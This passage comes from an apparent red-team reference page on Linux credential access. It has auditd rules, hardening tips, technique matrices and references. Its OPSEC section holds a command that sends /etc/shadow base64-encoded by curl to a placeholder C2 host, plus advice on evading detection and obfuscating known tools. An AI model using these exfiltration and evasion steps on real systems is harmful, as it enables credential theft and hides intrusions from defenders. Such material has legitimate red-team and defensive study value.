# Monitor cloud credential files
-w /root/.aws/credentials -p r -k cloud_credential_access
-w /root/.azure/ -p r -k cloud_credential_access
-w /root/.config/gcloud/ -p r -k cloud_credential_access
-w /root/.kube/config -p r -k cloud_credential_access

# Monitor keytab access
-w /etc/krb5.keytab -p r -k keytab_access

# Monitor process memory access
-a always,exit -F arch=b64 -S ptrace -k process_memory_access
-a always,exit -F arch=b64 -S process_vm_readv -k process_memory_access

# Monitor SSSD cache access
-w /var/lib/sss/db/ -p r -k sssd_cache_access

# Monitor browser credential databases
-w /root/.config/google-chrome/Default/Login Data -p r -k browser_credential_access
-w /root/.mozilla/ -p r -k browser_credential_access

# Monitor history file access (unusual for non-owner)
-w /root/.bash_history -p r -k history_access
```

### Hardening Recommendations

1. **Shadow file**: Ensure `/etc/shadow` is 640 root:shadow; use yescrypt hashing; enforce strong password policies.
2. **SSH agent**: Disable agent forwarding (`AllowAgentForwarding no`); use `ssh-add -t` for key timeouts; prefer ProxyJump over agent forwarding.
3. **Cloud credentials**: Use short-lived credentials and IAM roles instead of long-lived access keys; rotate keys regularly; use credential_process for dynamic credentials.
4. **Keytabs**: Restrict keytab file permissions to root only; rotate keytab keys regularly; monitor kinit usage.
5. **Process memory**: Set `kernel.yama.ptrace_scope=1` or higher to restrict ptrace; disable core dumps.
6. **History**: Set `HISTCONTROL=ignorespace` and `HISTSIZE=0` for sensitive sessions; use `unset HISTFILE`.
7. **Container secrets**: Enable etcd encryption at rest for Kubernetes secrets; use external secret managers (Vault, AWS Secrets Manager); limit RBAC permissions.
8. **Browser credentials**: Use a master password in Firefox; avoid storing credentials in browsers on shared systems.

---

## OPSEC Considerations

### Minimizing Footprint

```bash
# Read files to memory rather than copying to disk
# Use process substitution instead of temp files
john --wordlist=wordlist.txt <(unshadow /etc/passwd /etc/shadow)

# Base64 encode and exfiltrate rather than writing to disk
cat /etc/shadow | base64 | curl -s -X POST -d @- https://c2.example.com/upload

# Use /dev/shm (tmpfs) instead of /tmp for temporary files
# /dev/shm is memory-backed and does not touch disk
cp /etc/shadow /dev/shm/.shadow_copy
# Process the file
rm /dev/shm/.shadow_copy
```

### Avoiding Detection

- SSH agent hijacking leaves no artifacts on the victim's workstation; prefer it over key theft
- Process memory scraping via /proc is less likely to trigger alerts than file-based credential theft
- History file reads can be avoided by using `HISTFILE=/dev/null` before running sensitive commands
- Cloud credential exfiltration should be followed by API calls from expected geographic regions
- Avoid using tools with known signatures (mimipenguin, LaZagne) without obfuscation

### Lateral Movement Value Assessment

| Credential Type | Immediate Lateral Movement | Requires Cracking | Typical Scope |
|---|---|---|---|
| SSH agent | Yes | No | All hosts user has access to |
| Kerberos keytab | Yes | No | Domain/Kerberos realm |
| Kerberos ccache | Yes (time-limited) | No | Domain/Kerberos realm |
| Cloud credentials | Yes | No | Cloud environment (potentially all regions) |
| K8s service account | Yes | No | Kubernetes cluster |
| /etc/shadow hash | No | Yes | Local system (+ password reuse) |
| Browser passwords | Varies | Possibly | Web applications |
| GNOME Keyring | Varies | No (if unlocked) | Desktop applications |

---

## Credential Access Technique Selection Matrix

| Technique | Root Required | Offline Cracking Needed | Lateral Movement Value | OPSEC Risk |
|-----------|:------------:|:----------------------:|:---------------------:|:----------:|
| /etc/shadow | Yes | Yes | Medium (reuse) | Medium |
| SSSD cache | Yes | Yes | Medium | Medium |
| SSH agent hijacking | Root or same user | No | Very High | Low |
| GNOME Keyring | No* | Possibly | Medium | Low |
| KWallet | No* | Possibly | Medium | Low |
| Kerberos keytab | Yes | No | Very High | Medium |
| Kerberos ccache | Varies | No | High | Low |
| Cloud credentials | No | No | Very High | Medium |
| Container secrets | No** | No | High | Low |
| Process memory | Yes or same user | No | High | Medium |
| History files | No*** | No | Medium | Low |
| Config file mining | Varies | No | High | Low |
| Browser credentials | No* | Possibly | Medium | Low |

\* Requires active desktop session or file access
\** If running inside the container
\*** Own user history; root for other users

---

## Cross-References

- [Credential Stores](credential-stores.md) - Windows/cross-platform credential stores
- [Cloud Credential Access](cloud-credential-access.md) - Cloud-specific credential theft in depth
- [Password Cracking](password-cracking.md) - Offline hash cracking techniques and optimization
- [Kerberos Credential Attacks](kerberos-credential-attacks.md) - Kerberos-specific attacks (AS-REP roasting, Kerberoasting)
- [DPAPI Abuse](dpapi-abuse.md) - Windows DPAPI counterpart
- [LSASS Dumping](lsass-dumping.md) - Windows credential dumping counterpart
- [Linux Persistence](../04-persistence/linux-persistence.md) - Persistence techniques on Linux
- [Linux Privilege Escalation](../05-privilege-escalation/) - Required for root-level credential access
- [MITRE ATT&CK Index](../MITRE_ATTACK_INDEX.md) - Full technique index

---

## References

- MITRE ATT&CK T1003.008 - /etc/passwd and /etc/shadow: https://attack.mitre.org/techniques/T1003/008/
- MITRE ATT&CK T1003.007 - Proc Filesystem: https://attack.mitre.org/techniques/T1003/007/
- MITRE ATT&CK T1552.001 - Credentials in Files: https://attack.mitre.org/techniques/T1552/001/
- MITRE ATT&CK T1555.003 - Credentials from Web Browsers: https://attack.mitre.org/techniques/T1555/003/
- MITRE ATT&CK T1555.005 - Password Managers: https://attack.mitre.org/techniques/T1555/005/
- MITRE ATT&CK T1563.001 - SSH Hijacking: https://attack.mitre.org/techniques/T1563/001/
- MITRE ATT&CK T1558.005 - Ccache Files: https://attack.mitre.org/techniques/T1558/005/
- MITRE ATT&CK DET0256 - Detection Strategy for SSH Session Hijacking: https://attack.mitre.org/detectionstrategies/DET0256/
- Elastic Detection Rules - GDB Init Process Hooking: https://detection.fyi/elastic/detection-rules/linux/credential_access_gdb_init_process_hooking/
- HackTricks - SSH Forward Agent Exploitation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ssh-forward-agent-exploitation
- HackTricks - Linux Active Directory: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory
- Baeldung - /etc/shadow and Password Hashes: https://www.baeldung.com/linux/shadow-passwords
- Baeldung - Reading Process Memory: https://www.baeldung.com/linux/read-process-memory
- yescrypt Wikipedia: https://en.wikipedia.org/wiki/Yescrypt
- yescrypt_crack Tool: https://github.com/cyclone-github/yescrypt_crack
- HackBrowserData: https://github.com/moonD4rk/HackBrowserData
- firefox_decrypt: https://github.com/unode/firefox_decrypt
- Internal All The Things - Linux AD: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/
- Red Team Notes - Credential Access: https://www.ired.team/offensive-security/credential-access-and-credential-dumping
- SentinelOne - Cloudy With a Chance of Credentials (2025): https://www.sentinelone.com/labs/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/
- Datadog - 2025 State of Cloud Security: https://www.datadoghq.com/about/latest-news/press-releases/datadogs-2025-state-of-cloud-security-report-finds-companies-adopting-data-perimeters-amid-growing-concerns-of-credential-theft/
- Trend Micro - AWS Credential Exposure via Overprivileged Containers (2025): https://www.trendmicro.com/en_us/research/25/f/aws-credential-exposure-overprivileged-containers.html
- Aqua Security - Exposed Kubernetes Secrets: https://www.aquasec.com/blog/the-ticking-supply-chain-attack-bomb-of-exposed-kubernetes-secrets/
- Kubernetes v1.34 - Service Account Token Integration (2025): https://kubernetes.io/blog/2025/09/03/kubernetes-v1-34-sa-tokens-image-pulls-beta/
- Splunk - Linux Preload Hijack Library Calls: https://research.splunk.com/endpoint/cbe2ca30-631e-11ec-8670-acde48001122/
- GNOME Keyring ArchWiki: https://wiki.archlinux.org/title/GNOME/Keyring
- KDE Wallet ArchWiki: https://wiki.archlinux.org/title/KDE_Wallet
- Red Hat - SSSD Documentation: https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel
- Hashcat Forum - SHA512 Hash Parsing: https://hashcat.net/forum/thread-11099.html
